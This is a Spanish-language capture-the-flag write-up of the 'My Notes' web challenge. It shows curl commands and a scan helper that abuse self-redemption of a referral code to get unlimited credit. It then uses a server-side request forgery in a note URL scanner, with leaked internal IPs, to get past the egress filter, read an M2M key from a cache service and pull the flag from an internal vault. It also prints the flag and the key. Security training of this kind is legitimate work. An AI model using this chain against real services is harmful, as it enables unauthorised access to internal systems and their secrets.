<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=7EF700&center=true&vCenter=true&repeat=false&width=300&height=35&lines=My+Notes+" alt="Typing SVG" /></a>

<p><img src="/img/hackincariri.webp" alt="Hack in Cariri" height="600"></p>

</div>

<p align="center"><a href="WRITEUP.md">English</a> · <b>Español</b> · <a href="WRITEUP.pt-BR.md">Português (BR)</a></p>

# My Notes — WEB · 200 pts · 🟢 EASY

- **Status:** ✅ RESUELTO — 2 bugs encadenados.
- **Flag:** `HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7`
- **Flag format:** `HIK_[texto]_[md5]`
- **Acceso:** `https://<HOST>/`
- **Enunciado:** —

---

## 0. TL;DR

1. App de notas (MyNotes / StickerBoard) que busca server-side las URLs pegadas en una nota ("scan de malware") y devuelve el cuerpo de la respuesta en `response_preview` → SSRF full-response.
2. El scan cuesta crédito; el crédito se farmea con self-redeem del propio código de referral (gate de crédito roto).
3. Con crédito infinito, el SSRF enumera microservicios internos (IPs filtradas en los errores de egress), lee la clave M2M de un cache y se autentica en un vault que entrega la flag.

### Cadena que cerró
1. `POST /referrals/redeem {code}` con el propio código -> acredita ambos lados, repetible -> crédito infinito.
2. `POST /notes` con URL `http://internal-swagger/` -> bloqueado, pero el error de egress filtra la IP resuelta (`10.0.27.11`).
3. `scan http://10.0.27.11:8080/openapi.json` -> lista `cache-service:8080`, `vault-service:8080` (requiere M2M).
4. `scan http://10.0.27.2:8080/cache?key=secret:vault:m2m` -> `{"value":"sk-vault-lp2026-m2m-7f3b9d2c"}` (namespace `secret:*` oculto del listing, pero legible directo).
5. `scan "http://10.0.27.5:8080/get-token?api_key=sk-vault-lp2026-m2m-7f3b9d2c"` -> `{"flag":"HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7", ...}`.

---

## 1. Artefactos

- Ningún artefacto local — el objetivo es el servicio web vivo en `https://<HOST>/`.

## 2. Entrega / validación

- Flag devuelta directamente por la API interna (`vault-service`) en el cuerpo del `response_preview` del SSRF, sin proof-oracle externo.

## 3. Análisis

### 3.1 Recon

Página de login (StickerBoard) + board de notas. Dos sistemas en el HTML/JS inline:

- `POST /notes` manda `{title, content, color}`; las URLs en `content` son escaneadas y cada scan devuelve `{url, status_code, is_safe, response_preview}`.
- Referral: `GET /referrals/me`, `POST /referrals/redeem {code}`. El scan cuesta 1 crédito, empieza en 0.

Comentario de infra plantado en el `<head>`:

```html
<!-- infra: the URL scanner delegates to the internal microservice "internal-swagger"
     (backend network, off the internet). -->
```

### 3.2 Bug 1 — Self-redeem (gate de crédito)

El referral acredita "ambos lados" cuando alguien canjea tu código, y no valida que el código sea el propio. Canjear el propio código te acredita dos veces, repetible:

```bash
R=$(curl -s -X POST $B/auth/register -H 'Content-Type: application/json' \
      -d '{"username":"x","email":"x@x.com","password":"p"}')
TOK=...; CODE=...   # del JSON de retorno
curl -s -X POST $B/referrals/redeem -H "Authorization: Bearer $TOK" \
     -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}"
# -> {"redeemed":true,"reward":5,"scan_quota":10,...}  (repetir para acumular)
```

### 3.3 Bug 2 — SSRF full-response + bypass de egress por IP filtrada

`http://internal-swagger/` está bloqueado, pero el error filtra la IP resuelta:

```
[EGRESS-POLICY] Internal host blocked by egress policy: internal-swagger -> 10.0.27.11
```

La policy filtra por hostname, pero la IP:puerto directa pasa:

```bash
# helper: repone crédito + postea nota con la URL interna, lee response_preview
scan(){ curl -s -X POST $B/referrals/redeem ... -d "{\"code\":\"$CODE\"}" >/dev/null
        curl -s -X POST $B/notes -H "Authorization: Bearer $TOK" \
          -d "{\"title\":\"t\",\"content\":\"x $1\",\"color\":\"amarelo\"}"; }

scan http://10.0.27.11:8080/openapi.json   # OpenAPI de la API interna (puerto 8080!)
```

### 3.4 Pivot por la API interna

OpenAPI lista `servers`: `cache-service:8080`, `vault-service:8080` (requiere M2M). Endpoints: `GET /cache/keys`, `GET /cache`, `GET /get-token`. Resolvé cada host con el mismo truco de IP:

```bash
scan http://10.0.27.2:8080/cache/keys
# {"keys":["app:config:version",...]}  (namespace secret:* NO listado)

scan http://10.0.27.5:8080/
# hint: M2M via X-API-Key header OR api_key query param; credential in secret:vault:m2m

scan http://10.0.27.2:8080/cache?key=secret:vault:m2m
# {"value":"sk-vault-lp2026-m2m-7f3b9d2c"}   <- namespace oculto, legible directo

scan "http://10.0.27.5:8080/get-token?api_key=sk-vault-lp2026-m2m-7f3b9d2c"
# {"flag":"HIK_SSRF_CHALLS_ARE_COOL_aea1b1f194efa878429d678d0fe22ad7", ...}
```

(Vía SSRF solo se controla la URL → usá `?api_key=` en vez del header `X-API-Key`.)

## 4. Lo que no funcionó

No hay registro de hipótesis descartadas en el material original — ambos bugs fueron identificados directamente por el recon (comentario de infra + gate de referral sin validación).

## 5. Conclusión / próximos pasos

La cadena cerró con los dos bugs encadenados: self-redeem para crédito infinito de scans, y SSRF full-response con bypass de egress por IP filtrada para pivotear hasta el vault interno.

### Lecciones

- Un error de egress nunca debe filtrar la IP resuelta del host bloqueado — es todo el bypass.
- Esconder una clave del listing (`secret:*`) ≠ protegerla: `GET /cache?key=secret:...` la lee directo.
- Referral/credit sin chequear self-redeem = crédito infinito.

### Patrón en el Arsenal

`Arsenal/WEB/ssrf-internal-microservice-ip-leak.md`
